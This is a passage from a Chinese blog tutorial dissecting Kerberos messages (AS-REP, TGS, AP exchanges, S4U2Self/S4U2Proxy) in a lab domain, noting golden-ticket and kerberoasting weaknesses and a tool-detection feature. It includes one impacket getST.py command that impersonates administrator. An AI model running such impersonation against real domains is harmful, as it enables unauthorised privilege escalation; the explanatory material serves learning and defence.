class="token operator">-</span>NT<span class="token operator">-</span>SRV<span class="token operator">-</span>INST<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    sname<span class="token operator">-</span>string<span class="token punctuation">:</span> 2items      SNameString<span class="token punctuation">:</span> krbtgt      SNameString<span class="token punctuation">:</span> XIE<span class="token punctuation">.</span>COM  enc<span class="token operator">-</span>part<span class="token punctuation">:</span> TGT票据中的加密部分，这部门是用krbtgt的密码Hash加密的。因此如果我们拥有krbtgt的<span class="token builtin">hash</span>就可以自己制作一个ticket，这就造成了黄金票据攻击    etype<span class="token punctuation">:</span> 加密类型，这里是 eTYPE<span class="token operator">-</span>AES256<span class="token operator">-</span>CTS<span class="token operator">-</span>HMAC<span class="token operator">-</span>SHA1<span class="token operator">-</span><span class="token number">96</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span>    kvno<span class="token punctuation">:</span> 版本号，这里为<span class="token number">2</span>    cipher：加密后的值enc<span class="token operator">-</span>part：Login session key，这部分是用请求的用户密码Hash加密的，作为下阶段的认证密钥。  etype<span class="token punctuation">:</span> eTYPE<span class="token operator">-</span>AES256<span class="token operator">-</span>CTS<span class="token operator">-</span>HMAC<span class="token operator">-</span>SHA1<span class="token operator">-</span><span class="token number">96</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span>  kvno<span class="token punctuation">:</span> 版本号，这里为<span class="token number">3</span>  cipher：加密后的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>AS-REP返回包中最重要的就是TGT认购权证和加密的Logon Session Key了。TGT认购权证中加密部分是使用krbtgt密钥加密的，而Logon Session Key是使用请求的用户密钥加密的。下面我们通过解密WireShark来看看TGT认购权证和Logon Session Key中到底包含哪些内容。</p><h3 id="1-TGT认购权证"><a href="#1-TGT认购权证" class="headerlink" title="(1) TGT认购权证"></a>(1) TGT认购权证</h3><p>AS-REP响应包中的ticket便是TGT认购权证了。TGT认购权证中包含一些明文显示的信息，如版本号tkt-vno、域名realm、请求的服务名sname。但是TGT认购权证中最重要的还是加密部分，加密部分是使用krbtgt帐户密钥加密的。加密部分主要包含的内容有Logon Session Key、请求的用户名cname、域名crealm、认证时间authtime、认证到期时间endtime、authorization-data等信息。最重要的还是authorization-data部分，这部分中包含客户端的身份权限等信息，这些信息包含在PAC中。</p><p>如图所示，是TGT认购权证：</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640056922201-30615f30-888c-4c2a-8361-dfe9d98b2677.png" alt="img"></p><p>我们来看看TGT认购权证中authorization-data字段下代表用户身份权限的PAC是啥样的。我们对PAC进行解密，只查看PAC的凭证信息部分PAC_LOGON_INFO。如图所示，最主要的还是通过User RID和Group RID来辨别用户权限的。</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640057131610-147a6fbd-d695-40cf-97bd-d2fe5348ee5a.png" alt="img"></p><p>KDC生成PAC的过程如下：KDC在收到客户端发来的AS-REQ请求后，从请求中取出cname字段，然后查询活动目录数据库，找到sAMAccountName属性为cname字段的值的用户，用该用户的身份生成一个对应的PAC。</p><h3 id="2-Logon-Session-Key"><a href="#2-Logon-Session-Key" class="headerlink" title="(2) Logon Session Key"></a>(2) Logon Session Key</h3><p>AS-REP响应包最外层的那部分便是加密的Login session Key了，其作用是用于确保客户端和KDC下阶段之间通信安全，它使用请求的用户密钥加密。</p><p>我们对最外层的enc-part部分进行解密，如图所示，可以看到是使用hack用户的密钥对其进行解密的。</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640055955557-a7e4f52f-8da6-4ce8-8d4a-8f7a621a246f.png" alt="img"></p><p>解密结果如下：主要包含的内容是认证时间authtime、认证到期时间endtime、域名srealm、请求的服务名sname、协商标志flags等一些信息。需要说明的是，在TGT认购权证中也包含Logon Session Key。</p><h1 id="TGS-REQ-amp-TGS-REP"><a href="#TGS-REQ-amp-TGS-REP" class="headerlink" title="TGS-REQ &amp; TGS-REP"></a>TGS-REQ &amp; TGS-REP</h1><p>我们再来看看TGS-REQ&amp;TGS-REP请求部分，也就是WireShark抓的第三、四个包，如图所示：</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640057941341-d3a73d02-a396-4a9f-baca-0efc68142c5c.png" alt="img"></p><p>如图所示，是一个简易的TGS-REQ&amp;TGS-REP请求过程图，便于我们直观的了解TGS-REQ&amp;TGS-REP请求过程。</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640522552068-2594348e-0c14-4cc6-93a9-f191e3aad819.png" alt="img"></p><p>下面让我们具体的分析下TGS-REQ&amp;TGS-REP过程中的数据包细节：</p><p>客户端再收到KDC的AS-REP回复后，使用用户密钥解密enc_Logon Session Key(也就是最外层的enc-part)，得到Logon Session Key，并且也拿到了TGT认购权证。之后它会在本地缓存此 TGT认购权证 和 Logon Session Key。现在客户端需要凭借这张TGT认购凭证向KDC购买相应的ST服务票据（Service Ticket）<strong>。</strong>ST服务票据是KDC的另一个服务 <strong>TGS（Ticket Granting Service）</strong>票据授予服务发放的。在这个阶段，微软引入了两个扩展子协议 S4u2self 和 S4u2Proxy(当委派的时候，才用的到，我们会在后面的4.5章中详细介绍)。</p><h2 id="1-TGS-REQ请求包分析"><a href="#1-TGS-REQ请求包分析" class="headerlink" title="1. TGS-REQ请求包分析"></a>1. TGS-REQ请求包分析</h2><p>TGS-REQ：客户端拿着上一步获得的TGT认购权证发起TGS-REQ请求，向KDC购买针对指定服务的ST服务票据，该请求主要包含如下信息：</p><ul><li>域名(realm)。</li><li>请求的服务名(sname)。</li><li>TGT认购权证。</li><li>Authenticator：一个抽象的概念，代表一个验证。这里使用Logon Session Key加密的时间戳。</li><li>加密类型(etype)。</li><li>以及一些其他信息：如版本号，消息类型，协商选项，票据到期时间等。</li></ul><p>如图所示，是TGS-REQ请求包的详细：</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640076322271-9de70982-4ec1-4213-9f17-90ca4601fd67.png" alt="img"></p><p>下面我们来看看TGS-REQ请求包中每个字段的含义，如下所示：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">pvno<span class="token punctuation">:</span>kerberos版本号<span class="token punctuation">,</span>这里为<span class="token number">5</span>msg<span class="token operator">-</span><span class="token builtin">type</span><span class="token punctuation">:</span>消息类型<span class="token punctuation">,</span>TGS_REQ对应的是 krb<span class="token operator">-</span>tgs<span class="token operator">-</span>req<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>padata：padata中包含ap_req<span class="token punctuation">,</span>这个是TGS_REQ必须携带的部分<span class="token punctuation">,</span>这部分会携带AS_REP里面获取到的TGT认购权证和使用原始的Logon Session Key加密的时间戳。还有可能会有PA_FOR_USER，类型是S4U2SELF<span class="token punctuation">,</span>是一个唯一的标识符，该标识符指示用户的身份，该标识符由用户名和域名组成。S4U2Proxy必须扩展PA_FOR_USER结构，指定服务代表某个用户去请求针对服务自身的kerberos服务票据。还有可能会有PA_PAC_OPTIONS，类型是PA_PAC_OPTIONS。S4U2Proxy必须扩展PA<span class="token operator">-</span>PAC<span class="token operator">-</span>OPTIONS结构。如果是基于资源的约束委派，就需要指定Resource<span class="token operator">-</span>based Constrained Delegation位。  padata<span class="token operator">-</span><span class="token builtin">type</span><span class="token punctuation">:</span> padata类型，这里是 pA<span class="token operator">-</span>TGS<span class="token operator">-</span>REQ<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    padata<span class="token operator">-</span>value<span class="token punctuation">:</span> padata的值    ap<span class="token operator">-</span>req：这个是TGS_REQ必须携带的部分    pvn0<span class="token punctuation">:</span><span class="token number">5</span>        msg<span class="token operator">-</span><span class="token builtin">type</span><span class="token punctuation">:</span>krb<span class="token operator">-</span>ap<span class="token operator">-</span>req<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span>        padding<span class="token punctuation">:</span><span class="token number">0</span>        ap<span class="token operator">-</span>options<span class="token punctuation">:</span><span class="token number">00000000</span>    reserved<span class="token punctuation">:</span> <span class="token boolean">False</span>    use<span class="token operator">-</span>session<span class="token operator">-</span>key<span class="token punctuation">:</span> <span class="token boolean">False</span>    mutual<span class="token operator">-</span>required<span class="token punctuation">:</span> <span class="token boolean">False</span>        ticket AS<span class="token operator">-</span>REP响应包中返回的TGT认购权证            tkt<span class="token operator">-</span>vno<span class="token punctuation">:</span><span class="token number">5</span>            realm<span class="token punctuation">:</span> XIE<span class="token punctuation">.</span>COM            sname              name<span class="token operator">-</span><span class="token builtin">type</span><span class="token punctuation">:</span> kRB5<span class="token operator">-</span>NT<span class="token operator">-</span>SRV<span class="token operator">-</span>PRINCIPAL<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>              sname<span class="token operator">-</span>string<span class="token punctuation">:</span><span class="token number">2</span> items                SNameString<span class="token punctuation">:</span> krbtgt                SNameString<span class="token punctuation">:</span> XIE<span class="token punctuation">.</span>COM            enc<span class="token operator">-</span>part              etype<span class="token punctuation">:</span> eTYPE<span class="token operator">-</span>AES256<span class="token operator">-</span>CTS<span class="token operator">-</span>HMAC<span class="token operator">-</span>SHA1<span class="token operator">-</span><span class="token number">96</span> <span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span>              kvno<span class="token punctuation">:</span> <span class="token number">2</span>              cipher<span class="token punctuation">:</span> 加密后的值         authenticator<span class="token punctuation">:</span> 原始Logon Session Key加密的时间戳，用于保证会话安全         etype<span class="token punctuation">:</span> eTYPE<span class="token operator">-</span>AES256<span class="token operator">-</span>CTS<span class="token operator">-</span>HMAC<span class="token operator">-</span>SHA1<span class="token operator">-</span><span class="token number">96</span> <span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span>            cipher<span class="token punctuation">:</span> 加密后的值req<span class="token operator">-</span>body：请求body    padding<span class="token punctuation">:</span>这里为<span class="token number">0</span>    kdc<span class="token operator">-</span>options<span class="token punctuation">:</span>用于与KDC约定一些选项设置        reservedforwardable forwarded proxiable proxy allow<span class="token operator">-</span>postdate postdated unused7 renewable unused9 unused10 opt<span class="token operator">-</span>hardware<span class="token operator">-</span>auth unused12 unused13 constrained<span class="token operator">-</span>delegation canonicalize  request<span class="token operator">-</span>anonymous unused17 unused18 unused19 unused20 unused21 unused22 unused23 unused24 unused25 disable<span class="token operator">-</span>transited<span class="token operator">-</span>check renewable<span class="token operator">-</span>ok enc<span class="token operator">-</span>tkt<span class="token operator">-</span><span class="token keyword">in</span><span class="token operator">-</span>skey unused29 renew validate    realm<span class="token punctuation">:</span>域名，这里为XIE<span class="token punctuation">.</span>COM    sname：要请求的服务名      name<span class="token operator">-</span><span class="token builtin">type</span><span class="token punctuation">:</span> KRB5<span class="token operator">-</span>NT<span class="token operator">-</span>SRV<span class="token operator">-</span>INST<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>      sname<span class="token operator">-</span>string<span class="token punctuation">:</span> <span class="token number">2</span> items        SNameString<span class="token punctuation">:</span> cifs        SNameString<span class="token punctuation">:</span> win10<span class="token punctuation">.</span>xie<span class="token punctuation">.</span>com    till<span class="token punctuation">:</span>到期时间，rubeus和kekeo都是20370913024805Z，这个可以作为特征来检测工具。    nonce：随机生成的一个数。    etype：加密类型      ENCTYPE<span class="token punctuation">:</span> eTYPE<span class="token operator">-</span>ARCFOUR<span class="token operator">-</span>HMAC<span class="token operator">-</span>MD5<span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span>      ENCTYPE<span class="token punctuation">:</span> eTYPE<span class="token operator">-</span>DES3<span class="token operator">-</span>CBC<span class="token operator">-</span>SHA1<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>      ENCTYPE<span class="token punctuation">:</span> eTYPE<span class="token operator">-</span>DES<span class="token operator">-</span>CBC<span class="token operator">-</span>MD5 <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>      ENCTYPE<span class="token punctuation">:</span> eTYPE<span class="token operator">-</span>AES256<span class="token operator">-</span>CTS<span class="token operator">-</span>HMAC<span class="token operator">-</span>SHA1<span class="token operator">-</span><span class="token number">96</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们着重讲一下ap-req中的authenticator字段，该字段主要用于后阶段的会话安全认证。</p><p>为了确保后阶段的会话安全，TGS-REQ中ap-req中的authenticator字段的值是用上一步AS-REP中返回的Logon Session Key加密的时间戳，如图所示：</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640521439615-81e2b95a-11a9-42d3-ad5e-29961b0c330c.png" alt="img"></p><p>如图所示，在impacket&#x2F;krb5&#x2F;kerberosv5.py可以看到使用如下加密方式使用Logon Session Key加密的时间戳，</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1639970421799-e5731e0b-c9b2-4829-ac23-c82f970f34ef.png" alt="img"></p><h2 id="2-TGS-REP回复包分析"><a href="#2-TGS-REP回复包分析" class="headerlink" title="2. TGS-REP回复包分析"></a>2. TGS-REP回复包分析</h2><p>TGS-REP：KDC的TGS服务接收到TGS-REQ请求之后。首先使用krbtgt密钥解密TGT认购权证中加密部分得到Logon Session key和PAC等信息，如果能解密成功则说明该TGT认购权证是KDC颁发的。然后验证PAC的签名，如果签名正确，则证明PAC未经过篡改。然后使用Logon Session Key解密Authenticator得到时间戳等信息，如果能够解密成功，并且票据时间在范围内，则验证了会话的安全性。在完成上述的检测后，KDC的TGS服务完成了对客户端的认证，TGS服务发送响应包给客户端。响应包中主要包括如下信息：</p><ul><li>请求的用户名(cname)</li><li>域名(crealm)</li><li>ST服务票据：包含明文的版本号，域名，请求的服务名，以及加密部分enc-part，加密部分用服务密钥加密。加密部分包含用户名、域名、认证时间、认证到期时间、Service Session key和authorization-data。authorization-data中包含最重要的PAC特权属性证书(包含用户的RID，用户所在的组的RDI) 等。</li><li>enc_Service Session key：使用Logon Session key加密的Service Session key，其作用是用于确保客户端和KDC下阶段之间通信安全。</li><li>以及一些其他信息：如版本号、消息类型等。</li></ul><p>注：这里需要说明的是，TGS-REP这步中KDC并不会验证客户端是否有权限访问服务端。因此，这一步不管用户有没有访问服务的权限，只要TGT正确，均会返回ST服务票据，这也是kerberoasting能利用的原因，任何一个域内用户，都可以请求域内任何一个服务的ST服务票据。</p><p>如图所示，是TGS-REP回复包的详细：</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640087800596-b1b60e0a-4be6-49e8-8d27-405c8c885372.png" alt="img"></p><p>下面我们来看看TGS-REP回复包中每个字段的含义，如下所示：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">pvno<span class="token punctuation">:</span>kerberos版本号<span class="token punctuation">,</span>这里为<span class="token number">5</span>msg<span class="token operator">-</span><span class="token builtin">type</span><span class="token punctuation">:</span>消息类型<span class="token punctuation">,</span>TGS_REP对应的是 krb<span class="token operator">-</span>tgs<span class="token operator">-</span>rep<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>crealm<span class="token punctuation">:</span> 域名<span class="token punctuation">,</span>这里是XIE<span class="token punctuation">.</span>COMcname：请求的用户名  name<span class="token operator">-</span><span class="token builtin">type</span><span class="token punctuation">:</span> 名称类型，这里为 KRB5<span class="token operator">-</span>NT<span class="token operator">-</span>PRINCIPAL<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  cname<span class="token operator">-</span>string<span class="token punctuation">:</span> <span class="token number">1</span> item    CNameString<span class="token punctuation">:</span> hackticket：即ST服务票据  tkt<span class="token operator">-</span>vno<span class="token punctuation">:</span> 服务票据版本号，这里为<span class="token number">5</span>  realm<span class="token punctuation">:</span> 域名<span class="token punctuation">,</span>这里是XIE<span class="token punctuation">.</span>COM  sname<span class="token punctuation">:</span>    name<span class="token operator">-</span><span class="token builtin">type</span><span class="token punctuation">:</span> KRB5<span class="token operator">-</span>NT<span class="token operator">-</span>SRV<span class="token operator">-</span>HST<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    sname<span class="token operator">-</span>string<span class="token punctuation">:</span> <span class="token number">2</span> items      SNameString<span class="token punctuation">:</span> cifs      SNameString<span class="token punctuation">:</span> win10<span class="token punctuation">.</span>xie<span class="token punctuation">.</span>com  enc<span class="token operator">-</span>part<span class="token punctuation">:</span> 这部分是用服务的密钥加密的    etype<span class="token punctuation">:</span> 加密类型，eTYPE<span class="token operator">-</span>AES256<span class="token operator">-</span>CTS<span class="token operator">-</span>HMAC<span class="token operator">-</span>SHA1<span class="token operator">-</span><span class="token number">96</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span>    kvno<span class="token punctuation">:</span> 版本号，这里为<span class="token number">3</span>    cipher：加密后的值enc<span class="token operator">-</span>part：这部分是用原始的Logon Session Key加密的。里面最重要的字段是Service session key，作为下阶段的认证密钥。  etype<span class="token punctuation">:</span> 加密类型eTYPE<span class="token operator">-</span>AES256<span class="token operator">-</span>CTS<span class="token operator">-</span>HMAC<span class="token operator">-</span>SHA1<span class="token operator">-</span><span class="token number">96</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span>  cipher<span class="token punctuation">:</span> 加密后的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>TGS-REP返回包中最重要的就是ST服务票据和Service Session key了。ST服务票据中加密部分是使用服务密钥加密的，而Service Session key是使用Logon Session Key加密的。下面我们通过解密WireShark来看看ST服务票据和Service Session key中到底包含哪些内容。</p><h3 id="1-ST服务票据"><a href="#1-ST服务票据" class="headerlink" title="(1) ST服务票据"></a>(1) ST服务票据</h3><p>TGS-REP响应包中的ticket便是ST服务票据了。ST服务票据中包含明文显示的信息，如版本号tkt-vno、域名realm、请求的服务名sname。但是ST服务票据中最重要的还是加密部分，加密部分是使用服务密钥加密的。加密部分主要包含的内容有Server Session Key、请求的用户名cname、域名crealm、认证时间authtime、认证到期时间endtime、authorization-data等信息。最重要的还是authorization-data部分，这部分中包含客户端的身份权限等信息，这些信息包含在PAC中。</p><p>如图所示，是ST服务票据：</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640088832540-8baa2aa3-2c79-44b6-b840-31726198a0d0.png" alt="img"></p><p>我们来看看ST服务票据中authorization-data字段下代表用户身份权限的PAC是啥样的。我们对PAC进行解密，只查看PAC的凭证信息部分PAC_LOGON_INFO。如图所示，最主要的还是通过User RID和Group RID来辨别用户权限的。可以看到，ST服务票据中的PAC和TGT认购权证中的PAC是一致的。在正常的非S4u2Self请求的TGS过程中，KDC在ST服务票据中的PAC是直接拷贝TGT票据中的PAC。</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640088951509-5cab0612-fd2d-4925-bb1d-feaeb7f8bff7.png" alt="img"></p><h3 id="2-Service-Session-Key"><a href="#2-Service-Session-Key" class="headerlink" title="(2) Service Session Key"></a>(2) Service Session Key</h3><p>TGS-REP响应包最外层的那部分便是Service Session Key了，其作用是用于确保客户端和KDC下阶段之间通信安全，它使用Logon Session Key加密。</p><p>如图所示，对其进行解密，它主要包含的内容是认证时间authtime、认证到期时间endtime、域名srealm、请求的服务名sname、协商标志flags等一些信息。需要说明的是，在ST服务票据中也包含Service Session Key。</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640088678195-d497794a-26ea-43f2-9aa1-0bd770d06d2f.png" alt="img"></p><h1 id="如何双向认证？-AP-REQ-amp-AP-REP"><a href="#如何双向认证？-AP-REQ-amp-AP-REP" class="headerlink" title="如何双向认证？(AP-REQ&amp;AP-REP)"></a>如何双向认证？(AP-REQ&amp;AP-REP)</h1><p>客户端在收到KDC返回的TGS-REP消息，从中取出ST服务票据后，就准备要开始申请访问服务了。由于我们是通过SMB协议远程连接的，因此AP-REQ&amp;AP-REP消息是放在SMB协议中。如图所示：</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640140339782-cbde4a00-a3bb-4700-a507-125c6773a49c.png" alt="img"></p><p>注：通过impacket远程连接服务默认是不需要验证提供服务的服务端的，因此这里没有AP-REP回复。</p><p>如图所示，是一个简易的AP-REQ&amp;AP-REP请求过程图，便于我们直观的了解AP-REQ&amp;AP-REP请求过程。</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640522699222-6b1ead6f-954f-4974-ad98-fc8c6c4ac7e5.png" alt="img"></p><h2 id="1-AP-REQ请求包分析"><a href="#1-AP-REQ请求包分析" class="headerlink" title="1. AP-REQ请求包分析"></a>1. AP-REQ请求包分析</h2><p>AP-REQ：客户端接收到KDC的TGS回复后，通过缓存的Logon Session Key解密enc_Service Session key得到Service Session Key，同时它也拿到了ST(Service Ticket)服务票据。Serivce Session Key 和 ST服务票据会被客户端缓存。客户端访问指定服务时，将发起AP-REQ请求，该请求主要包含如下的内容：</p><ul><li>ST服务票据(ticket)</li><li>Authenticator：一个抽象的概念，代表一个验证。这里指Serivce Session Key加密的时间戳</li><li>以及一些其他信息：如版本号、消息类型，协商选项等</li></ul><p>如图所示，是AP-REQ请求包的详细：</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1629354357466-2f993629-bee7-435e-a6c9-430873703057.png" alt="img"></p><p>下面我们来看看AP-REQ请求包中每个字段的含义，如下所示：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">pvno<span class="token punctuation">:</span>kerberos版本号<span class="token punctuation">,</span>这里为<span class="token number">5</span>msg<span class="token operator">-</span><span class="token builtin">type</span><span class="token punctuation">:</span>消息类型<span class="token punctuation">,</span> AP_REQ 对应的是 krb<span class="token operator">-</span>ap<span class="token operator">-</span>req<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span>Padding<span class="token punctuation">:</span>填充<span class="token punctuation">,</span>这里为<span class="token number">0</span>ap<span class="token operator">-</span>options<span class="token punctuation">:</span> 一些协商选项reserved    use<span class="token operator">-</span>session<span class="token operator">-</span>key    mutual<span class="token operator">-</span>required  该选项代表客户端是否希望验证提供服务的服务端ticket<span class="token punctuation">:</span> ST服务票据    tkt<span class="token operator">-</span>vno<span class="token punctuation">:</span> 版本号，这里为<span class="token number">5</span>    realm<span class="token punctuation">:</span> XIE<span class="token punctuation">.</span>COM    sname<span class="token punctuation">:</span>服务名        name<span class="token operator">-</span><span class="token builtin">type</span><span class="token punctuation">:</span> KRB5<span class="token operator">-</span>NT<span class="token operator">-</span>SRV<span class="token operator">-</span>INST<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>        sname<span class="token operator">-</span>string<span class="token punctuation">:</span> <span class="token number">2</span> item2            SNameString<span class="token punctuation">:</span> cifs            SNameString<span class="token punctuation">:</span> win10<span class="token punctuation">.</span>xie<span class="token punctuation">.</span>com    enc<span class="token operator">-</span>part<span class="token punctuation">:</span> ST服务票据中加密部分        etype<span class="token punctuation">:</span>加密类型，eTYPE<span class="token operator">-</span>AES256<span class="token operator">-</span>CTS<span class="token operator">-</span>HMAC<span class="token operator">-</span>SHA1<span class="token operator">-</span><span class="token number">96</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span>        kvno<span class="token punctuation">:</span> 版本号，这里是<span class="token number">2</span>        cipher<span class="token punctuation">:</span>加密后的值authenticator<span class="token punctuation">:</span> Serivce Session Key加密的时间戳    etype：加密类型    cipher：加密后的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-AP-REP回复包分析"><a href="#2-AP-REP回复包分析" class="headerlink" title="2. AP-REP回复包分析"></a>2. AP-REP回复包分析</h2><p>AP-REP：这一步是可选的，当客户端希望验证提供服务的服务端时(也就是AP-REQ请求中mutual-required协商选项为True)，服务端返回AP-REP消息。服务端收到客户端发来的AP-REQ消息后，通过服务密钥解密ST服务票据得到Service Session Key和PAC等信息，然后用Service Session Key 解密 Authenticator得到时间戳。如果能解密成功且时间戳在有效范围内，则验证了客户端的身份。验证了客户端身份后，服务端从ST服务票据中取出PAC中代表用户身份权限信息的数据，然后与请求的服务ACL做对比，生成相应的访问令牌。同时，服务端会检查AP-REQ请求中mutual-required协商选项是否为True，如果为True的话，说明客户端想验证服务端的身份。此时，服务端会用Service Session Key加密时间戳作为Authenticator，在AP-REP响应包中发送给客户端进行验证。如果mutual-required选项为False的话，服务端会根据访问令牌的权限决定是否返回相应的服务给客户端。</p><p>注：由于impacket默认是不需要验证服务端身份的，因此如图所示是其他请求方式的AP-REP回复包截图。</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1629354400201-1e181d5a-6e18-4ae9-8b59-e3d64d5dadc9.png" alt="img"></p><p>AP-REP响应包中主要包括如下信息：</p><ul><li>版本号</li><li>消息类型</li><li>enc-part：使用Serivce Session Key加密的时间戳</li></ul><p>如下是AP-REP回复包的详细：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">pvno：<span class="token number">5</span>msg<span class="token operator">-</span><span class="token builtin">type</span>：消息类型<span class="token punctuation">,</span> AP_REP 对应的是 krb<span class="token operator">-</span>ap<span class="token operator">-</span>rep<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>enc<span class="token operator">-</span>part：Serivce Session Key加密的时间戳etype：加密类型    cipher：加密后的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="S4u2Self-amp-S4u2Proxy"><a href="#S4u2Self-amp-S4u2Proxy" class="headerlink" title="S4u2Self&amp;S4u2Proxy"></a>S4u2Self&amp;S4u2Proxy</h1><p>为了在Kerberos协议层面对约束性委派的支持，微软对Kerberos协议扩展了两个自协议 S4u2self(Service for User to Self) 和 S4u2Proxy (Service for User to Proxy )。S4u2self 可以代表任意用户请求针对自身的服务票据；S4u2Proxy可以用上一步获得的ST服务票据以用户的名义请求针对其它指定服务的ST服务票据。</p><p>执行如下命令，machine$机器用户模拟administrator身份访问自身服务。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python3 getST<span class="token punctuation">.</span>py <span class="token operator">-</span>dc<span class="token operator">-</span>ip AD01<span class="token punctuation">.</span>xie<span class="token punctuation">.</span>com xie<span class="token punctuation">.</span>com<span class="token operator">/</span>machine\$<span class="token punctuation">:</span>root <span class="token operator">-</span>spn cifs<span class="token operator">/</span>ad01<span class="token punctuation">.</span>xie<span class="token punctuation">.</span>com <span class="token operator">-</span>impersonate administrator <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如图所示，machine$机器账号以S4u2Self协议模拟administrator身份访问自身服务。</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640524685207-46117c71-1a25-46e3-9387-fffdf03794df.png" alt="img"></p><h2 id="1-S4u2Self"><a href="#1-S4u2Self" class="headerlink" title="1. S4u2Self"></a>1. S4u2Self</h2><p>和正常的TGS-REQ请求包相比，S4u2Self协议的TGS-REQ请求包会多一个PA-DATA pA-TGS-USER，name为要模拟的用户。并且sname也是请求的服务自身。如图所示：</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640524476827-aa647603-fef3-41ae-a55a-62f36a299a8e.png" alt="img"></p><h2 id="2-S4u2Proxy"><a href="#2-S4u2Proxy" class="headerlink" title="2. S4u2Proxy"></a>2. S4u2Proxy</h2><p>和正常的TGS-REQ请求包相比，S4u2Proxy协议的TGS-REQ请求包会增加一个additional-tickets字段，该字段的内容就是上一步利用S4u2Self请求的ST服务票据。如图所示：</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640525480973-ae28720b-c35b-4182-a739-fdd20e14a3de.png" alt="img"></p><h1 id="Kerberos协议的安全问题"><a href="#Kerberos协议的安全问题" class="headerlink" title="Kerberos协议的安全问题"></a>Kerberos协议的安全问题</h1><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1625585121188-bd0905f5-4f78-49aa-ac84-e9fd733a97c8.png" alt="img"> 如图所示，是Kerberos协议各阶段容易产生的安全问题：</p><p><img 